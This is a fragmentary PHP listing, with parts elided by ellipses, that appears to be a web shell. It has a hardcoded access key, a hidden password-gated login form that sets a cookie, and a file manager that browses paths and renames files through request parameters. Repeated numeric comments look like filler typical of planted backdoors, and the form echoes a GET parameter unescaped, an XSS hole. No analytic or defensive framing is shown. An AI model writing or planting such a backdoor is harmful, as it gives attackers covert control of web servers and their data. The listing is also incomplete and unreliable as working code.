...
$auth_key = "6bbf28fea8ec77200d4fc5a88d1abe93";
...
$pass = false;
if (isset($_COOKIE['pw_name_61376'])) {
    if(($_COOKIE['pw_name_61376']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_61376'])) {
        if(($_POST['pw_name_61376']) == $auth_key) {
            setcookie("pw_name_61376", $_POST['pw_name_61376']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_61376' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728343633174085 1728343633465302 1728343633283555 1728343633186580
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728343633174085 1728343633465302 1728343633283555 1728343633186580
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728343633174085 1728343633465302 1728343633283555 1728343633186580
            $name = PATH . "/" . $_GET['r'];
